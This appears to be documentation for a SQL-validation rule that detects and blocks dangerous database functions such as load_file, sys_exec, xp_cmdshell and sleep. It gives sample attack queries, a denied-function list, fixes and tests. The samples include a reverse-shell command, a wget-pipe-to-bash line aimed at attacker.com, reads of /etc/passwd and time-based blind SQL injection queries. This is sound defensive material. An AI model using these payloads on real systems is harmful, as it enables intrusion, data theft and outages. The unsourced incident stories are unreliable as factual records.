# Dangerous Function Rule

**Risk Level:** 🔴 CRITICAL

## Overview

The Dangerous Function rule detects and blocks dangerous database functions that enable file operations, OS command execution, and DoS attacks. These functions can be exploited by attackers to compromise database servers, exfiltrate data, or cause service disruption.

## What It Detects

Dangerous functions that can be exploited for attacks:

- **File Operations:** `load_file`, `into_outfile`, `into_dumpfile`
- **OS Command Execution:** `sys_exec`, `sys_eval`, `xp_cmdshell`
- **DoS Attacks:** `sleep`, `benchmark`, `pg_sleep`, `waitfor`
- **Data Exfiltration:** `dbms_pipe`

## Why Dangerous

### File Read Attack (load_file)

```sql
-- ❌ CRITICAL: Reads arbitrary files from server
SELECT load_file('/etc/passwd')

-- ❌ CRITICAL: Reads database configuration
SELECT load_file('/var/lib/mysql/my.cnf')
```

**Real-World Impact:**
- Attacker reads sensitive configuration files
- Database credentials exposed
- Server filesystem enumerated
- Potential for privilege escalation

### OS Command Execution (sys_exec/sys_eval)

```sql
-- ❌ CRITICAL: Executes OS commands
SELECT sys_exec('whoami')

-- ❌ CRITICAL: Creates reverse shell
SELECT sys_exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')
```

**Real-World Impact:**
- Full server compromise
- Malware installation
- Data theft
- Lateral movement in network

### DoS Attack (sleep/benchmark)

```sql
-- ❌ CRITICAL: Delays query execution
SELECT * FROM users WHERE sleep(30) = 0

-- ❌ CRITICAL: CPU exhaustion attack
SELECT benchmark(10000000, SHA1('test'))
```

**Real-World Impact:**
- Database server unresponsive
- Connection pool exhaustion
- Application timeout errors
- Service disruption for all users

### Time-Based Blind SQL Injection

```sql
-- ❌ CRITICAL: Extracts data via timing
SELECT * FROM users WHERE IF(SUBSTRING(password,1,1)='a', sleep(5), 0)

-- ❌ CRITICAL: Enumerates database structure
SELECT * FROM users WHERE IF((SELECT COUNT(*) FROM admin_users)>0, sleep(5), 0)
```

**Real-World Impact:**
- Bypasses error-based SQL injection defenses
- Extracts sensitive data character by character
- Enumerates database schema
- Difficult to detect in logs

## Examples

### BAD: File Read in SELECT

```sql
-- ❌ CRITICAL: Reads /etc/passwd
SELECT load_file('/etc/passwd')
```

**Violation Message:**
```
[CRITICAL] 检测到危险函数: load_file (可能存在安全风险)
MapperId: com.example.UserMapper.getData
SQL: SELECT load_file('/etc/passwd')
Suggestion: 移除危险函数 load_file，使用安全的替代方案
```

### BAD: Sleep in WHERE Clause

```sql
-- ❌ CRITICAL: DoS attack via sleep
SELECT * FROM users WHERE sleep(10) = 0
```

**Violation Message:**
```
[CRITICAL] 检测到危险函数: sleep (可能存在安全风险)
MapperId: com.example.UserMapper.selectAll
SQL: SELECT * FROM users WHERE sleep(10) = 0
Suggestion: 移除危险函数 sleep，使用安全的替代方案
```

### BAD: Nested Dangerous Function

```sql
-- ❌ CRITICAL: load_file nested in CONCAT
SELECT CONCAT(load_file('/etc/passwd'), 'suffix')
```

**Violation Message:**
```
[CRITICAL] 检测到危险函数: load_file (可能存在安全风险)
MapperId: com.example.DataMapper.extract
SQL: SELECT CONCAT(load_file('/etc/passwd'), 'suffix')
Suggestion: 移除危险函数 load_file，使用安全的替代方案
```

### BAD: Dangerous Function in Subquery

```sql
-- ❌ CRITICAL: load_file in subquery
SELECT * FROM users WHERE id IN (SELECT load_file('/etc/passwd'))
```

### BAD: Dangerous Function in CASE WHEN

```sql
-- ❌ CRITICAL: sleep in CASE expression
SELECT CASE WHEN sleep(1) > 0 THEN 'a' ELSE 'b' END FROM users
```

### GOOD: Safe Functions

```sql
-- ✅ SAFE: Aggregate functions
SELECT MAX(id), MIN(id), COUNT(*), AVG(age) FROM users

-- ✅ SAFE: String functions
SELECT CONCAT(first_name, ' ', last_name) FROM users

-- ✅ SAFE: Date functions
SELECT NOW(), DATE_FORMAT(created_at, '%Y-%m-%d') FROM orders

-- ✅ SAFE: Math functions
SELECT ROUND(price * 1.1, 2) FROM products
```

## Dangerous Functions Reference

### MySQL

| Function | Risk | Description |
|----------|------|-------------|
| `load_file` | File Read | Reads arbitrary files from server filesystem |
| `into_outfile` | File Write | Writes query results to file |
| `into_dumpfile` | File Write | Writes binary data to file |
| `sleep` | DoS | Delays query execution |
| `benchmark` | DoS | CPU-intensive operation for timing attacks |

### PostgreSQL

| Function | Risk | Description |
|----------|------|-------------|
| `pg_sleep` | DoS | Delays query execution |
| `pg_read_file` | File Read | Reads files (superuser only) |
| `pg_read_binary_file` | File Read | Reads binary files |

### Oracle

| Function | Risk | Description |
|----------|------|-------------|
| `sys_exec` | OS Command | Executes OS commands (UDF) |
| `sys_eval` | OS Command | Executes OS commands with output |
| `dbms_pipe` | Data Exfil | Inter-session communication |

### SQL Server

| Function | Risk | Description |
|----------|------|-------------|
| `xp_cmdshell` | OS Command | Executes OS commands |
| `waitfor` | DoS | Delays query execution |

## Expected Messages

### File Read Violation

```
[CRITICAL] 检测到危险函数: load_file (可能存在安全风险)
MapperId: {namespace}.{methodId}
SQL: SELECT load_file('{path}')
Suggestion: 移除危险函数 load_file，使用安全的替代方案
Risk: Arbitrary file read from server
```

### DoS Violation

```
[CRITICAL] 检测到危险函数: sleep (可能存在安全风险)
MapperId: {namespace}.{methodId}
SQL: SELECT * FROM {table} WHERE sleep({seconds}) = 0
Suggestion: 移除危险函数 sleep，使用安全的替代方案
Risk: Denial of service attack
```

### OS Command Violation

```
[CRITICAL] 检测到危险函数: sys_exec (可能存在安全风险)
MapperId: {namespace}.{methodId}
SQL: SELECT sys_exec('{command}')
Suggestion: 移除危险函数 sys_exec，使用安全的替代方案
Risk: Remote code execution
```

## How to Fix

### Option 1: Remove Dangerous Functions (Recommended)

```sql
-- Before (dangerous)
SELECT load_file('/etc/passwd')

-- After (safe) - Use application-level file reading
-- Read files through your application code, not SQL
```

```java
// Before (dangerous)
@Select("SELECT load_file(#{path})")
String readFile(@Param("path") String path);

// After (safe) - Use Java file API
public String readFile(String path) {
    return Files.readString(Path.of(path));
}
```

### Option 2: Use Safe Alternatives

```sql
-- Before (DoS risk)
SELECT * FROM users WHERE sleep(5) = 0

-- After (safe) - Remove timing-based conditions
SELECT * FROM users WHERE id = ?
```

### Option 3: Restrict Database Permissions

```sql
-- MySQL: Revoke FILE privilege
REVOKE FILE ON *.* FROM 'app_user'@'%';

-- PostgreSQL: Don't grant superuser
REVOKE pg_read_server_files FROM app_user;

-- SQL Server: Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

## Configuration

### Enable/Disable

```yaml
sql-guard:
  rules:
    dangerous-function:
      enabled: true  # Default: true
```

### Adjust Risk Level

```yaml
sql-guard:
  rules:
    dangerous-function:
      risk-level: CRITICAL  # Default: CRITICAL
```

**Not recommended:** Downgrading risk level reduces security.

### Customize Denied Functions

```yaml
sql-guard:
  rules:
    dangerous-function:
      denied-functions:
        - load_file
        - sys_exec
        - sys_eval
        - sleep
        - benchmark
        - pg_sleep
        - xp_cmdshell
        # Add custom dangerous functions
        - custom_dangerous_udf
```

### Remove Functions from Denied List

```yaml
sql-guard:
  rules:
    dangerous-function:
      denied-functions:
        # Only deny file operations, allow sleep for testing
        - load_file
        - sys_exec
        - sys_eval
        # sleep removed for development environment
```

**Warning:** Only remove functions from the denied list in controlled development environments.

## Detection Strategy

### Recursive AST Traversal

DangerousFunctionChecker uses recursive ExpressionVisitor to find all Function objects in the SQL statement:

1. **SELECT clause:** Functions in SELECT items
2. **WHERE clause:** Functions in conditions
3. **HAVING clause:** Functions in HAVING conditions
4. **ORDER BY clause:** Functions in ORDER BY expressions
5. **Nested functions:** Functions inside other function arguments
6. **Subqueries:** Functions in subquery expressions
7. **CASE expressions:** Functions in WHEN/THEN/ELSE clauses

### Case-Insensitive Matching

Function names are matched case-insensitively:
- `load_file` ✓
- `LOAD_FILE` ✓
- `Load_File` ✓

## Edge Cases

### Case 1: Function in Subquery

```sql
-- Dangerous function in subquery is detected
SELECT * FROM users WHERE id IN (SELECT load_file('/etc/passwd'))
```

**Behavior:** Detected and blocked

### Case 2: Deeply Nested Function

```sql
-- Dangerous function nested multiple levels
SELECT UPPER(LOWER(CONCAT(load_file('/etc/passwd'), 'x')))
```

**Behavior:** Detected and blocked (recursive traversal)

### Case 3: Function in CASE Expression

```sql
-- Dangerous function in CASE WHEN
SELECT CASE WHEN sleep(1) > 0 THEN 'a' ELSE 'b' END FROM users
```

**Behavior:** Detected and blocked

### Case 4: Empty Denied List

```yaml
sql-guard:
  rules:
    dangerous-function:
      denied-functions: []  # Empty list
```

**Behavior:** All functions allowed (checker effectively disabled)

## Production Incidents Prevented

### Incident 1: Database Server Compromise

**Company:** Financial services  
**Incident:** Attacker exploited SQL injection to execute `sys_exec('wget http://attacker.com/shell.sh | bash')`  
**Impact:** Full server compromise, data breach  
**Prevention:** SQL Guard would have blocked sys_exec function

### Incident 2: Data Exfiltration via File Read

**Company:** Healthcare provider  
**Incident:** Attacker used `load_file('/var/lib/mysql/patient_data.frm')` to read database files  
**Impact:** HIPAA violation, patient data exposed  
**Prevention:** SQL Guard would have blocked load_file function

### Incident 3: DoS Attack via Sleep

**Company:** E-commerce platform  
**Incident:** Attacker sent requests with `WHERE sleep(30) = 0` causing connection pool exhaustion  
**Impact:** 2 hours downtime during peak sales  
**Prevention:** SQL Guard would have blocked sleep function

## Best Practices

### 1. Keep Default Denied Functions

```yaml
# Use default configuration - don't remove security functions
sql-guard:
  rules:
    dangerous-function:
      enabled: true
      # Use default denied-functions list
```

### 2. Restrict Database User Permissions

```sql
-- Create application user with minimal privileges
CREATE USER 'app_user'@'%' IDENTIFIED BY 'secure_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'%';
-- DO NOT GRANT: FILE, SUPER, PROCESS privileges
```

### 3. Use Parameterized Queries

```java
// ❌ Dangerous: String concatenation
String sql = "SELECT * FROM users WHERE name = '" + userInput + "'";

// ✅ Safe: Parameterized query
@Select("SELECT * FROM users WHERE name = #{name}")
User findByName(@Param("name") String name);
```

### 4. Monitor for Suspicious Queries

```yaml
sql-guard:
  rules:
    dangerous-function:
      enabled: true
  audit:
    enabled: true
    log-violations: true
```

## Testing

### Unit Test Example

```java
@Test
public void testDangerousFunctionDetection() {
    // Given
    String sql = "SELECT load_file('/etc/passwd')";
    SqlContext context = SqlContext.builder()
        .sql(sql)
        .type(SqlCommandType.SELECT)
        .mapperId("DataMapper.readFile")
        .build();
    
    // When
    ValidationResult result = validator.validate(context);
    
    // Then
    assertFalse(result.isPassed());
    assertEquals(RiskLevel.CRITICAL, result.getRiskLevel());
    assertTrue(result.getViolations().get(0).getMessage()
        .contains("load_file"));
}
```

### Integration Test Example

```java
@Test
public void testDangerousFunctionBlocked() {
    // Given: BLOCK strategy configured
    
    // When/Then: SQLException thrown
    assertThrows(SQLException.class, () -> {
        dataMapper.executeQuery("SELECT sleep(10)");
    });
}
```

## Related Rules

- **[INTO OUTFILE Rule](into-outfile.md)** - Detects MySQL file write operations
- **[No WHERE Clause Rule](no-where-clause.md)** - Prevents full table operations
- **[Multi-Statement Rule](multi-statement.md)** - Detects SQL injection attempts

## Next Steps

- **[Configuration Reference](../configuration-reference.md)** - Configure rule settings
- **[Deployment Guide](../deployment.md)** - Roll out to production safely
- **[Troubleshooting Guide](../troubleshooting.md)** - Debug common issues

---

**Questions?** See [FAQ](../faq.md) or [Troubleshooting Guide](../troubleshooting.md).
